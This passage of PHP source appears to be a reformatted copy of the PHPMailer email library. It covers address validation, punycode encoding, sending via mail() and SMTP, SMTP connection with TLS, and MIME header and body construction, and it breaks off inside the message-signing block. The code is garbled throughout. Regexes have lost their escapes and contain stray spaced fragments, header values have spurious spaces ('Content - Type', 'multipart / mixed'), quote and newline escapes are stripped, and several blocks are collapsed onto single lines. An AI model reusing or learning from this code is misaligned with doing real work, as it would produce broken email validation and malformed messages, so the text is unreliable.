					case 'pcre8': return (boolean)preg_match('/^(?!(?>(?1)"?(?>\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\[ -~]|[^"])"?(?1)){65,}@)' . '((?>(?>(?>((?>(?>(?>x0Dx0A)?[t ])+|(?>[t ]*x0Dx0A)?[t ]+)?)(((?>(?2)' . '(?>[x01-x08x0Bx0Cx0E-' * -[] - x7F] | [x00 - x7F] | ( ? 3))) * ( ? 2)))) + ( ? 2)) | ( ? 2)) ?) '.'([! //-'*+/-9=?^-~-]+|"(?>(?2)(?>[x01-x08x0Bx0Cx0E-!#-[]-x7F]|\[x00-x7F]))*'.'(?2)")(?>(?1).(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)'.'(?>(?1).(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}'.'|(?!(?:.*[a-f0-9][:]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:'.'|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}'.'|[1-9]?[0-9])(?>.(?9)){3}))])(?1)$/isD',$address);
					case 'pcre':return (boolean) preg_match('/^(?!(?>"?(?>\[ -~]|[^"])"?){255,})(?!(?>"?(?>\[ -~]|[^"])"?){65,}@)(?>'.'[!#-'*+/-9=?^-~-]+|"(?>(?>[x01-x08x0Bx0Cx0E-!#-[]-x7F]|\[x00-xFF]))*")'.'(?>.(?>[!#-'*+/-9=?^-~-]+|"(?>(?>[x01-x08x0Bx0Cx0E-!#-[]-x7F]|\[x00-xFF]))*"))*'.'@(?>(?![a-z0-9-]{64,})(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)(?>.(?![a-z0-9-]{64,})'.'(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)){0,126}|[(?:(?>IPv6:(?>(?>[a-f0-9]{1,4})(?>:'.'[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:]]){8,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?'.'::(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?))|(?>(?>IPv6:(?>[a-f0-9]{1,4}(?>:'.'[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4})?'.'::(?>(?:[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4}):)?))?(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}'.'|[1-9]?[0-9])(?>.(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))])$/isD',$address);
					case 'html5':return (boolean) preg_match('/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}'.'[a-zA-Z0-9])?(?:.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',$address);
					case 'noregex':return(strlen($address)>=3 and strpos($address,'@')>=1 and strpos($address,'@')!=strlen($address)-1);
					case 'php':default:return (boolean) filter_var($address,FILTER_VALIDATE_EMAIL);
					}
					}
			public function idnSupported(){
				return function_exists('idn_to_ascii')and function_exists('mb_convert_encoding');
					}
					
					
					
public function punyencodeAddress($address)
{
	if ($this->idnSupported() and !empty($this->CharSet) and ($pos = strrpos($address, '@')) !== false)
	{
		$domain = substr($address, ++$pos);
		if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet))
		{
			$domain = mb_convert_encoding($domain, 'UTF-8', $this->CharSet);
			if (($punycode = defined('INTL_IDNA_VARIANT_UTS46') ? idn_to_ascii($domain, 0, INTL_IDNA_VARIANT_UTS46) : idn_to_ascii($domain)) !== false)
			{
				return substr($address, 0, $pos) . $punycode;
			}
		}
	}

	return $address;
}

public function send()
{
	try
	{
		if (!$this->preSend())
		{
			return false;
		}

		return $this->postSend();
	}

	catch(phpmailerException $exc)
	{
		$this->mailHeader = '';
		$this->setError($exc->getMessage());
		if ($this->exceptions)
		{
			throw $exc;
		}

		return false;
	}
}

public function preSend()
{
	try
	{
		$this->error_count = 0;
		$this->mailHeader = '';
		foreach(array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $params)
		{
			$params[1] = $this->punyencodeAddress($params[1]);
			call_user_func_array(array(
				$this,
				'addAnAddress'
			) , $params);
		}

		if ((count($this->to) + count($this->cc) + count($this->bcc)) < 1)
		{
			throw new phpmailerException(('provide_address') , self::STOP_CRITICAL);
		}

		foreach(array(
			'From',
			'Sender',
			'ConfirmReadingTo'
		) as $address_kind)
		{
			$this->$address_kind = trim($this->$address_kind);
			if (empty($this->$address_kind))
			{
				continue;
			}

			$this->$address_kind = $this->punyencodeAddress($this->$address_kind);
			if (!$this->validateAddress($this->$address_kind))
			{
				$error_message = ('invalid_address') . ' (punyEncode) ' . $this->$address_kind;
				$this->setError($error_message);
				$this->edebug($error_message);
				if ($this->exceptions)
				{
					throw new phpmailerException($error_message);
				}

				return false;
			}
		}

		if ($this->alternativeExists())
		{
			$this->ContentType = 'multipart/alternative';
		}

		$this->setMessageType();
		if (!$this->AllowEmpty and empty($this->Body))
		{
			throw new phpmailerException(('empty_message') , self::STOP_CRITICAL);
		}

		$this->MIMEHeader = '';
		$this->MIMEBody = $this->createBody();
		if ($this->Mailer == 'mail')
		{
			if (count($this->to) > 0)
			{
				$this->mailHeader.= $this->addrAppend('To', $this->to);
			}
			else
			{
				$this->mailHeader.= $this->headerLine('To', 'undisclosed-recipients:;');
			}

			$this->mailHeader.= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader(trim($this->Subject))));
		}

		$tempheaders = $this->MIMEHeader;
		$this->MIMEHeader = $this->createHeader();
		$this->MIMEHeader.= $tempheaders;
		return true;
	}

	catch(phpmailerException $exc)
	{
		$this->setError($exc->getMessage());
		if ($this->exceptions)
		{
			throw $exc;
		}

		return false;
	}
}

public function postSend()
{
	try
	{
		if ($this->Mailer == 'mail') return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
		return $this->smtpSend($this->MIMEHeader, $this->MIMEBody);
	}

	catch(phpmailerException $exc)
	{
		$this->setError($exc->getMessage());
		$this->edebug($exc->getMessage());
		if ($this->exceptions)
		{
			throw $exc;
		}
	}

	return false;
}

public

function getSMTPInstance()
{
	if (!is_object($this->smtp))
	{
		$this->smtp = new SMTP;
	}

	return $this->smtp;
}

protected function mailSend($header, $body)
{
	$toArr = array();
	foreach($this->to as $toaddr)
	{
		$toArr[] = $this->addrFormat($toaddr);
	}

	$to = implode(', ', $toArr);
	$params = null;
	if (!empty($this->Sender) and $this->validateAddress($this->Sender))
	{
		if (self::isShellSafe($this->Sender))
		{
			$params = sprintf('-f%s', $this->Sender);
		}
	}

	if (!empty($this->Sender) and !ini_get('safe_mode') and $this->validateAddress($this->Sender))
	{
		$old_from = ini_get('sendmail_from');
		ini_set('sendmail_from', $this->Sender);
	}

	$result = false;
	if ($this->SingleTo and count($toArr) > 1)
	{
		foreach($toArr as $toAddr)
		{
			$result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);
			$this->doCallback($result, array(
				$toAddr
			) , $this->cc, $this->bcc, $this->Subject, $body, $this->From);
		}
	}
	else
	{
		$result = $this->mailPassthru($to, $this->Subject, $body, $header, $params);
		$this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
	}

	if (isset($old_from))
	{
		ini_set('sendmail_from', $old_from);
	}

	if (!$result)
	{
		throw new phpmailerException(('instantiate') , self::STOP_CRITICAL);
	}

	return true;
}

protected static
function isShellSafe($string)
{
	if (escapeshellcmd($string) !== $string or !in_array(escapeshellarg($string) , array(
		"'$string'",
		""$string""
	)))
	{
		return false;
	}

	$length = strlen($string);
	for ($i = 0; $i < $length; $i++)
	{
		$c = $string[$i];
		if (!ctype_alnum($c) && strpos('@_-.', $c) === false)
		{
			return false;
		}
	}

	return true;
}

protected function smtpSend($header, $body)
{
	$bad_rcpt = array();
	if (!$this->smtpConnect($this->SMTPOptions))
	{
		throw new phpmailerException(('smtp_connect_failed') , self::STOP_CRITICAL);
	}

	if (!empty($this->Sender) and $this->validateAddress($this->Sender))
	{
		$smtp_from = $this->Sender;
	}
	else
	{
		$smtp_from = $this->From;
	}

	if (!$this->smtp->mail($smtp_from))
	{
		$this->setError(('from_failed') . $smtp_from . ' : ' . implode(',', $this->smtp->getError()));
		throw new phpmailerException($this->ErrorInfo, self::STOP_CRITICAL);
	}

	foreach(array(
		$this->to,
		$this->cc,
		$this->bcc
	) as $togroup)
	{
		foreach($togroup as $to)
		{
			if (!$this->smtp->recipient($to[0]))
			{
				$error = $this->smtp->getError();
				$bad_rcpt[] = array(
					'to' => $to[0],
					'error' => $error['detail']
				);
				$isSent = false;
			}
			else
			{
				$isSent = true;
			}

			$this->doCallback($isSent, array(
				$to[0]
			) , array() , array() , $this->Subject, $body, $this->From);
		}
	}

	if ((count($this->all_recipients) > count($bad_rcpt)) and !$this->smtp->data($header . $body))
	{
		throw new phpmailerException(('data_not_accepted') , self::STOP_CRITICAL);
	}

	if ($this->SMTPKeepAlive)
	{
		$this->smtp->reset();
	}
	else
	{
		$this->smtp->quit();
		$this->smtp->close();
	}

	if (count($bad_rcpt) > 0)
	{
		$errstr = '';
		foreach($bad_rcpt as $bad)
		{
			$errstr.= $bad['to'] . ': ' . $bad['error'];
		}

		throw new phpmailerException(('recipients_failed') . $errstr, self::STOP_CONTINUE);
	}

	return true;
}

public

function smtpConnect($options = null)
{
	if (is_null($this->smtp))
	{
		$this->smtp = $this->getSMTPInstance();
	}

	if (is_null($options))
	{
		$options = $this->SMTPOptions;
	}

	if ($this->smtp->connected())
	{
		return true;
	}

	$this->smtp->setTimeout($this->Timeout);
	$this->smtp->setDebugLevel($this->SMTPDebug);
	$this->smtp->setDebugOutput($this->Debugoutput);
	$this->smtp->setVerp($this->do_verp);
	$hosts = explode(';', $this->Host);
	$lastexception = null;
	foreach($hosts as $hostentry)
	{
		$hostinfo = array();
		if (!preg_match('/^((ssl|tls)://)*([a-zA-Z0-9:[].-]*):?([0-9]*)$/', trim($hostentry) , $hostinfo))
		{
			continue;
		}

		$prefix = '';
		$secure = $this->SMTPSecure;
		$tls = ($this->SMTPSecure == 'tls');
		if ('ssl' == $hostinfo[2] or ('' == $hostinfo[2] and 'ssl' == $this->SMTPSecure))
		{
			$prefix = 'ssl://';
			$tls = false;
			$secure = 'ssl';
		}
		elseif ($hostinfo[2] == 'tls')
		{
			$tls = true;
			$secure = 'tls';
		}

		$sslext = defined('OPENSSL_ALGO_SHA1');
		if ('tls' === $secure or 'ssl' === $secure)
		{
			if (!$sslext)
			{
				throw new phpmailerException(('extension_missing') . 'openssl', self::STOP_CRITICAL);
			}
		}

		$host = $hostinfo[3];
		$port = $this->Port;
		$tport = (integer)$hostinfo[4];
		if ($tport > 0 and $tport < 65536)
		{
			$port = $tport;
		}

		if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options))
		{
			try
			{
				if ($this->Helo)
				{
					$hello = $this->Helo;
				}
				else
				{
					$hello = $this->serverHostname();
				}

				$this->smtp->hello($hello);
				if ($this->SMTPAutoTLS and $sslext and $secure != 'ssl' and $this->smtp->getServerExt('STARTTLS'))
				{
					$tls = true;
				}

				if ($tls)
				{
					if (!$this->smtp->startTLS())
					{
						throw new phpmailerException(('connect_host'));
					}

					$this->smtp->hello($hello);
				}

				if ($this->SMTPAuth)
				{
					if (!$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->Realm, $this->Workstation))
					{
						throw new phpmailerException(('authenticate'));
					}
				}

				return true;
			}

			catch(phpmailerException $exc)
			{
				$lastexception = $exc;
				$this->edebug($exc->getMessage());
				$this->smtp->quit();
			}
		}
	}

	$this->smtp->close();
	if ($this->exceptions and !is_null($lastexception))
	{
		throw $lastexception;
	}

	return false;
}

public

function smtpClose()
{
	if (is_a($this->smtp, 'SMTP'))
	{
		if ($this->smtp->connected())
		{
			$this->smtp->quit();
			$this->smtp->close();
		}
	}
}

public

function addrAppend($type, $addr)
{
	$addresses = array();
	foreach($addr as $address)
	{
		$addresses[] = $this->addrFormat($address);
	}

	return $type . ': ' . implode(', ', $addresses) . $this->LE;
}

public

function addrFormat($addr)
{
	if (empty($addr[1]))
	{
		return $this->secureHeader($addr[0]);
	}
	else
	{
		return $this->encodeHeader($this->secureHeader($addr[1]) , 'phrase') . ' <' . $this->secureHeader($addr[0]) . '>';
	}
}

public

function setWordWrap()
{
	if ($this->WordWrap < 1)
	{
		return;
	}

	switch ($this->message_type)
	{
	case 'alt':
	case 'alt_inline':
	case 'alt_attach':
	case 'alt_inline_attach':
		$this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap);
		break;

	default:
		$this->Body = $this->wrapText($this->Body, $this->WordWrap);
		break;
	}
}

public

function createHeader()
{
	$result = '';
	$result.= $this->headerLine('Date', $this->MessageDate == '' ? self::rfcDate() : $this->MessageDate);
	if ($this->SingleTo)
	{
		if ($this->Mailer != 'mail')
		{
			foreach($this->to as $toaddr)
			{
				$this->SingleToArray[] = $this->addrFormat($toaddr);
			}
		}
	}
	else
	{
		if (count($this->to) > 0)
		{
			if ($this->Mailer != 'mail')
			{
				$result.= $this->addrAppend('To', $this->to);
			}
		}
		elseif (count($this->cc) == 0)
		{
			$result.= $this->headerLine('To', 'undisclosed-recipients:;');
		}
	}

	$result.= $this->addrAppend('From', array(
		array(
			trim($this->From) ,
			$this->FromName
		)
	));
	if (count($this->cc) > 0)
	{
		$result.= $this->addrAppend('Cc', $this->cc);
	}

	if (($this->Mailer == 'sendmail' or $this->Mailer == 'qmail' or $this->Mailer == 'mail') and count($this->bcc) > 0)
	{
		$result.= $this->addrAppend('Bcc', $this->bcc);
	}

	if (count($this->ReplyTo) > 0)
	{
		$result.= $this->addrAppend('Reply-To', $this->ReplyTo);
	}

	if ($this->Mailer != 'mail')
	{
		$result.= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject)));
	}

	if ('' != $this->MessageID and preg_match('/^<.*@.*>$/', $this->MessageID))
	{
		$this->lastMessageID = $this->MessageID;
	}
	else
	{
		$this->lastMessageID = sprintf('<%s@%s>', $this->uniqueid, $this->serverHostname());
	}

	$result.= $this->headerLine('Message-ID', $this->lastMessageID);
	if (!is_null($this->Priority))
	{
		$result.= $this->headerLine('X-Priority', $this->Priority);
	}

	if ($this->XMailer == '')
	{
		$result.= $this->headerLine('X-Mailer', 'PHPMailer ' . $this->Version . ' (https://github.com/PHPMailer/PHPMailer)');
	}
	else
	{
		$myXmailer = trim($this->XMailer);
		if ($myXmailer)
		{
			$result.= $this->headerLine('X-Mailer', $myXmailer);
		}
	}

	if ($this->ConfirmReadingTo != '')
	{
		$result.= $this->headerLine('Disposition-Notification-To', '<' . $this->ConfirmReadingTo . '>');
	}

	foreach($this->CustomHeader as $header)
	{
		$result.= $this->headerLine(trim($header[0]) , $this->encodeHeader(trim($header[1])));
	}

	if (!$this->sign_key_file)
	{
		$result.= $this->headerLine('MIME-Version', '1.0');
		$result.= $this->getMailMIME();
	}

	return $result;
}

public

function getMailMIME()
{
	$result = '';
	$ismultipart = true;
	switch ($this->message_type)
	{
	case 'inline':
		$result.= $this->headerLine('Content-Type', 'multipart/related;');
		$result.= $this->textLine("tboundary="".$this->boundary[1].'"');break;case 'attach':case 'inline_attach':case 'alt_attach':case 'alt_inline_attach':$result.=$this->headerLine('Content - Type','multipart / mixed;
		');$result.=$this->textLine("tboundary="".$this->boundary[1].'"');break;case 'alt':case 'alt_inline':$result.=$this->headerLine('Content-Type','multipart/alternative;');$result.=$this->textLine("tboundary = "" . $this->boundary[1] . '"');
		break;

	default:
		$result.= $this->textLine('Content-Type: ' . $this->ContentType . '; charset=' . $this->CharSet);
		$ismultipart = false;
		break;
	}

	if ($this->Encoding != '7bit')
	{
		if ($ismultipart)
		{
			if ($this->Encoding == '8bit')
			{
				$result.= $this->headerLine('Content-Transfer-Encoding', '8bit');
			}
		}
		else
		{
			$result.= $this->headerLine('Content-Transfer-Encoding', $this->Encoding);
		}
	}

	if ($this->Mailer != 'mail')
	{
		$result.= $this->LE;
	}

	return $result;
}

protected
function generateId()
{
	return md5(uniqid(time()));
}

public

function createBody()
{
	$body = '';
	$this->uniqueid = $this->generateId();
	$this->boundary[1] = 'b1_' . $this->uniqueid;
	$this->boundary[2] = 'b2_' . $this->uniqueid;
	$this->boundary[3] = 'b3_' . $this->uniqueid;
	if ($this->sign_key_file)
	{
		$body.= $this->getMailMIME() . $this->LE;
	}

	$this->setWordWrap();
	$bodyEncoding = $this->Encoding;
	$bodyCharSet = $this->CharSet;
	if ($bodyEncoding == '8bit' and !$this->has8bitChars($this->Body))
	{
		$bodyEncoding = '7bit';
		$bodyCharSet = 'us-ascii';
	}

	if ('base64' != $this->Encoding and self::hasLineLongerThanMax($this->Body))
	{
		$bodyEncoding = 'quoted-printable';
	}

	$altBodyEncoding = $this->Encoding;
	$altBodyCharSet = $this->CharSet;
	if ($altBodyEncoding == '8bit' and !$this->has8bitChars($this->AltBody))
	{
		$altBodyEncoding = '7bit';
		$altBodyCharSet = 'us-ascii';
	}

	if ('base64' != $altBodyEncoding and self::hasLineLongerThanMax($this->AltBody))
	{
		$altBodyEncoding = 'quoted-printable';
	}

	$mimepre = "This is a multi-part message in MIME format." . $this->LE . $this->LE;
	switch ($this->message_type)
	{
	case 'inline':
		$body.= $mimepre;
		$body.= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
		$body.= $this->encodeString($this->Body, $bodyEncoding);
		$body.= $this->LE . $this->LE;
		$body.= $this->attachAll('inline', $this->boundary[1]);
		break;

	case 'attach':
		$body.= $mimepre;
		$body.= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
		$body.= $this->encodeString($this->Body, $bodyEncoding);
		$body.= $this->LE . $this->LE;
		$body.= $this->attachAll('attachment', $this->boundary[1]);
		break;

	case 'inline_attach':
		$body.= $mimepre;
		$body.= $this->textLine('--' . $this->boundary[1]);
		$body.= $this->headerLine('Content-Type', 'multipart/related;');
		$body.= $this->textLine("tboundary="".$this->boundary[2].'"');$body.=$this->LE;$body.=$this->getBoundary($this->boundary[2],$bodyCharSet,'',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->attachAll('inline',$this->boundary[2]);$body.=$this->LE;$body.=$this->attachAll('attachment',$this->boundary[1]);break;case 'alt':$body.=$mimepre;$body.=$this->getBoundary($this->boundary[1],$altBodyCharSet,'text / plain',$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->getBoundary($this->boundary[1],$bodyCharSet,'text / html',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;if(!empty($this->Ical)){$body.=$this->getBoundary($this->boundary[1],'','text / calendar;
		method = REQUEST','');$body.=$this->encodeString($this->Ical,$this->Encoding);$body.=$this->LE.$this->LE;}$body.=$this->endBoundary($this->boundary[1]);break;case 'alt_inline':$body.=$mimepre;$body.=$this->getBoundary($this->boundary[1],$altBodyCharSet,'text / plain',$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->textLine('--'.$this->boundary[1]);$body.=$this->headerLine('Content - Type','multipart / related;
		');$body.=$this->textLine("tboundary="".$this->boundary[2].'"');$body.=$this->LE;$body.=$this->getBoundary($this->boundary[2],$bodyCharSet,'text/html',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->attachAll('inline',$this->boundary[2]);$body.=$this->LE;$body.=$this->endBoundary($this->boundary[1]);break;case 'alt_attach':$body.=$mimepre;$body.=$this->textLine('--'.$this->boundary[1]);$body.=$this->headerLine('Content-Type','multipart/alternative;');$body.=$this->textLine("tboundary = "" . $this->boundary[2] . '"');
		$body.= $this->LE;
		$body.= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
		$body.= $this->encodeString($this->AltBody, $altBodyEncoding);
		$body.= $this->LE . $this->LE;
		$body.= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
		$body.= $this->encodeString($this->Body, $bodyEncoding);
		$body.= $this->LE . $this->LE;
		$body.= $this->endBoundary($this->boundary[2]);
		$body.= $this->LE;
		$body.= $this->attachAll('attachment', $this->boundary[1]);
		break;

	case 'alt_inline_attach':
		$body.= $mimepre;
		$body.= $this->textLine('--' . $this->boundary[1]);
		$body.= $this->headerLine('Content-Type', 'multipart/alternative;');
		$body.= $this->textLine("tboundary="".$this->boundary[2].'"');$body.=$this->LE;$body.=$this->getBoundary($this->boundary[2],$altBodyCharSet,'text / plain',$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->textLine('--'.$this->boundary[2]);$body.=$this->headerLine('Content - Type','multipart / related;
		');$body.=$this->textLine("tboundary="".$this->boundary[3].'"');$body.=$this->LE;$body.=$this->getBoundary($this->boundary[3],$bodyCharSet,'text/html',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->attachAll('inline',$this->boundary[3]);$body.=$this->LE;$body.=$this->endBoundary($this->boundary[2]);$body.=$this->LE;$body.=$this->attachAll('attachment',$this->boundary[1]);break;default:$this->Encoding=$bodyEncoding;$body.=$this->encodeString($this->Body,$this->Encoding);break;}if($this->isError()){$body = '';
		}elseif($this->sign_key_file){try{if(!defined('PKCS7_TEXT')){throw new phpmailerException(('extension_missing').'openssl');}$file=tempnam(sys_get_temp_dir(),'mail');if(false===file_put_contents($file,$body)){throw new phpmailerException(('signing').' Could not write temp file');}$signed=tempnam(sys_get_temp_dir(),'signed');if(empty($this->sign_extracerts_file)){$sign = @openssl_pkcs7_sign($file, $signed, 'file://' . realpath($this->sign_cert_file) , array(
			'file://' . realpath($this->sign_key_file) ,
			$this->sign_key_pass
		) , null);
		}else{$sign = @openssl_pkcs7_sign($file, $signed, 'file://' . realpath($this->sign_cert_file) , array(
			'file://' . realpath($this->sign_key_file) ,
			$this->sign_key_pass
		) , null, PKCS7_DETACHED, $this->sign_extracerts_file);
		}if($sign){@unlink($file);$body=file_get_contents($signed);@unlink($signed);$parts=explode("nn",$body,2);$this->MIMEHeader.=$parts[0].$this->LE.$this->LE;$body=$parts[1];}else{@unlink($file);@unlink($signed);throw new phpmailerException(('signing').openssl_error_string());}}catch(phpmailerException $exc){$body = '';
		if ($this->exceptions)
		{
			throw $exc;
			}}
